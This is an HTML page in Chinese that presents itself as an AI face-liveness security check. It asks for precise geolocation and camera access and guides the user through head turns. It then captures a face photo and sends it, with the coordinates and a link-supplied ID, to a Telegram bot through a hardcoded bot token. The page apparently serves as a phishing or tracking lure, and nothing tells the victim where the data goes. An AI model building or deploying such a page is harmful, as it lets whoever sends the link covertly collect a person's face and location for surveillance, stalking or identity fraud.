<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔒 智能AI交互核验</title>
    <!-- 引入 MediaPipe 库用于前端 AI 实时人脸与动作检测 -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
    
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
        
        #video-container { position: relative; width: 640px; height: 480px; max-width: 100%; margin-bottom: 20px; display: none; }
        #video { width: 100%; height: 100%; background: #000; border: 3px solid #ffcc00; border-radius: 12px; object-fit: cover; }
        
        .face-frame {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 240px; height: 320px;
            border: 3px dashed rgba(255, 204, 0, 0.7);
            border-radius: 50% / 40%;
            pointer-events: none;
            box-shadow: 0 0 15px rgba(255, 204, 0, 0.4);
        }

        #status { 
            margin: 15px 20px; 
            font-weight: bold; 
            background: rgba(0,0,0,0.8); 
            padding: 20px; 
            border-radius: 10px; 
            font-size: 20px; 
            border: 1px solid #333;
            max-width: 600px;
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #ffcc00; color: #111; font-weight: bold; transition: background 0.3s; }
        button:hover { background: #e0b800; }
        
        .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
    </style>
</head>
<body>
    <div id="app">
        <h2>🛡️ 智能 AI 动态活体核验</h2>
        <div id="status">点击开始以激活 AI 视觉识别</div>

        <div id="video-container">
            <!-- 实际视频流 -->
            <video id="video" autoplay playsinline muted></video>
            <div class="face-frame"></div>
        </div>
        
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="startBtn">启动 AI 核验 🔐</button>
    </div>

    <script>
        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
        const app = document.getElementById('app');
        const video = document.getElementById('video');
        const videoContainer = document.getElementById('video-container');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        let aiState = 'WAITING'; // WAITING -> CHECK_POSITION -> CHECK_TURN_LEFT -> CHECK_TURN_RIGHT -> SUCCESS
        let currentStream = null;

        function showError(errName, errMessage) {
            app.innerHTML = `<div class="error-page">
                <p>⚠️ <b>错误类型：</b> ${errName || '未知错误'}</p>
                <p>💬 <b>详细信息：</b> ${errMessage || '无法启动视频源。'}</p>
                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px; display:block; width:100%;">重试</button>
            </div>`;
        }

        function speakPrompt(text) {
            status.innerText = text;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'zh-CN';
                utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { 
                status.innerText = "❌ 链接中缺少验证 ID (?id=...)"; 
                return; 
            }
            startBtn.style.display = 'none';

            let locationText = "未获取到位置信息";
            try {
                status.innerText = "正在验证设备地理位置节点 📍";
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                });
                locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) {
                console.warn("Geolocation warning:", err);
            }

            try {
                status.innerText = "正在初始化 AI 视觉引擎...";
                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = currentStream;
                videoContainer.style.display = 'block';

                // 初始化 MediaPipe FaceMesh 进行本地 AI 识别
                initAIVision(locationText);

            } catch (err) {
                console.error("Camera start error:", err);
                showError(err.name, err.message);
            }
        });

        function initAIVision(locationText) {
            aiState = 'CHECK_POSITION';
            speakPrompt("请将面部正对屏幕，保持在相框内");

            const faceMesh = new FaceMesh({
                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
            });

            faceMesh.setOptions({
                maxNumFaces: 1,
                refineLandmarks: true,
                minDetectionConfidence: 0.5,
                minTrackingConfidence: 0.5
            });

            faceMesh.onResults((results) => {
                if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
                    return; // 没检测到人脸，等待用户调整
                }

                const landmarks = results.multiFaceLandmarks[0];
                
                // 简单的 AI 逻辑判定：
                // 鼻尖点为 1，左耳大致为 234，右耳大致为 454
                const nose = landmarks[1];
                const leftEar = landmarks[234];
                const rightEar = landmarks[454];

                // 计算左右眼/耳与鼻子的相对距离，用来判断头部左右转动
                const leftDist = Math.abs(nose.x - leftEar.x);
                const rightDist = Math.abs(nose.x - rightEar.x);
                const ratio = leftDist / (rightDist + 0.0001);

                if (aiState === 'CHECK_POSITION') {
                    // 判断是否正对屏幕（左右距离相对均衡）
                    if (ratio > 0.8 && ratio < 1.2) {
                        aiState = 'CHECK_TURN_LEFT';
                        speakPrompt("AI 检测成功！请缓慢向左转头");
                    }
                } 
                else if (aiState === 'CHECK_TURN_LEFT') {
                    // 向左转头：鼻子明显靠近右侧，ratio 变大
                    if (ratio > 1.4) {
                        aiState = 'CHECK_TURN_RIGHT';
                        speakPrompt("很好！请缓慢向右转头");
                    }
                } 
                else if (aiState === 'CHECK_TURN_RIGHT') {
                    // 向右转头：鼻子靠近左侧，ratio 变小
                    if (ratio < 0.7) {
                        aiState = 'SUCCESS';
                        speakPrompt("活体动作达标，AI 识别通过，正在自动提交...");
                        faceMesh.close();
                        setTimeout(() => {
                            captureAndUpload(currentStream, locationText);
                        }, 1000);
                    }
                }
            });

            // 用 Camera 工具把视频帧喂给 AI 模型
            const camera = new Camera(video, {
                onFrame: async () => {
                    if (aiState !== 'SUCCESS') {
                        await faceMesh.send({ image: video });
                    }
                },
                width: 640,
                height: 480
            });
            camera.start();
        }

        async function captureAndUpload(stream, locationText) {
            status.innerText = "正在打包生物特征数据...";
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.innerText = "⚠️ 图像帧捕获失败。";
                    return;
                }
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'liveness_check.jpg');
                formData.append('caption', `🛡️ [智能 AI 活体核验日志]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: AI 识别动作为真，流程自动完成。`);

                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    const data = await res.json();
                    
                    if (data.ok) {
                        status.style.color = "#00ffcc";
                        status.innerText = "✅ AI 活体核验全部通过！";
                        stream.getTracks().forEach(t => t.stop());
                        videoContainer.style.display = 'none';
                    } else {
                        status.innerText = "⚠️ 传输错误: " + (data.description || "未知错误");
                    }
                } catch (e) {
                    status.innerText = "⚠️ 上传时发生网络错误。";
                }
            }, 'image/jpeg', 0.95);
        }
    </script>
</body>
</html>
